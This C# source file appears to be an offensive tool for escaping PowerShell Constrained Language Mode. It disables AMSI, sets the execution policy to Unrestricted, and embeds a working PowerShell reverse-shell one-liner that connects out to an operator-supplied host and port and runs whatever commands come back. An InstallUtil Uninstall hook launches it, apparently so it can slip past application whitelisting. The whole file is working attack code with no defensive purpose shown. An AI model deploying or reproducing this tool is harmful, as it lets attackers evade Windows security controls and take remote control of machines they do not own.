using System;
using System.Collections.ObjectModel;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;

namespace PsBypassCostraintLanguageMode
{
    public class Program
    {
        public static void Main(string[] args)
        {
            string command = "", rhost = "", port = "";
            // checking for RevShell mode
            bool revShell = false;
            if (args != null && args.Length > 0 && !string.IsNullOrEmpty(args[0]) && !string.IsNullOrEmpty(args[1]))
            {
                revShell = true;
                rhost = args[0];
                port = args[1];
            }


            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();

            // OLD ** Amsi bypass technique from: http://cn33liz.blogspot.co.uk/2016/05/bypassing-amsi-using-powershell-5-dll.html
            // OLD ** string Arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            // OLD ** AmsiBypass.Amsi(Arch);
            // NEW ** https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass/Program.cs
            AmsiBypass.Disable();

            // set execution policy to Unrestricted for current process
            // this should bypass costraint language mode from the low priv 'ConstrainedLanguage' to our beloved 'FullLanguage'
            RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);
            runSpaceInvoker.Invoke("Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process");

			//rev shell one-liner
			//string revShellcommand = @"$client = New-Object System.Net.Sockets.TCPClient('{RHOST}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";

			//rev shell better one-liner (pretty printed) with exception handling
			string revShellcommand = @"$client = New-Object System.Net.Sockets.TCPClient('{RHOST}',{PORT});
                                    $stream = $client.GetStream();
                                    [byte[]]$bytes = 0..65535|%{0};
                                    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
                                    {
	                                    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
	                                    try
	                                    {	
		                                    $sendback = (iex $data 2>&1 | Out-String );
		                                    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
	                                    }
	                                    catch
	                                    {
		                                    $error[0].ToString() + $error[0].InvocationInfo.PositionMessage;
		                                    $sendback2  =  ""ERROR: "" + $error[0].ToString() + ""`n`n"" + ""PS "" + (pwd).Path + '> ';
	                                    }	
	                                    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	                                    $stream.Write($sendbyte,0,$sendbyte.Length);
	                                    $stream.Flush();
                                    };
                                    $client.Close();" ;

            // funny intro
            if (!revShell)
                Console.WriteLine("Type your P0w3rSh3ll command down here \n");
            else
            {
                revShellcommand = revShellcommand.Replace("{RHOST}", rhost).Replace("{PORT}", port);
            }

            // loop for getting commands from Stdin
            do
            {
                if (!revShell)
                {
                    Console.Write("PS > ");
                    command = Console.ReadLine();
                }
                else
                {
                    command = revShellcommand;
                }

                // vervbse check!
                if (!string.IsNullOrEmpty(command))
                {
                    using (Pipeline pipeline = runspace.CreatePipeline())
                    {
                        try
                        {

                            pipeline.Commands.AddScript(command);
                            pipeline.Commands.Add("Out-String");
                            // if revshell true - run asyn one-liner script and exit
                            if (revShell)
                            {
                                Console.Write("Trying to connect back...\n");
                            }
                            // otherwise stay open and ready to accept and invoke commands
                            Collection<PSObject> results = pipeline.Invoke();
							//var process = (Process)pipeline.Output.Read().BaseObject;

							StringBuilder stringBuilder = new StringBuilder();
                            foreach (PSObject obj in results)
                            {
								stringBuilder.AppendLine(obj.ToString());
                            }
                            Console.Write(stringBuilder.ToString());
                        }
                        catch (Exception ex)
                        {
                            if (revShell)
                                revShellcommand = "";
                            Console.WriteLine("{0}", ex.Message);
                        }
                    }
                }
            }
            while (command != "exit");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtil : System.Configuration.Install.Installer
    {
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string rhost = "", port = "";
            string revshell = this.Context.Parameters["revshell"];
            if (!string.IsNullOrEmpty(revshell))
            {
                rhost = this.Context.Parameters["rhost"];
                if (rhost == null)
                {
                    throw new InstallException("Mandatory parameter 'rhost' for revshell mode");
                }

                port = this.Context.Parameters["rport"];
                if (port == null)
                {
                    throw new InstallException("Mandatory parameter 'port' for revshell mode");
                }
            }
            string[] args = new string[] { rhost, port };
            PsBypassCostraintLanguageMode.Program.Main(args);
        }

        public override void Install(System.Collections.IDictionary savedState)
        {

        }

    }

}
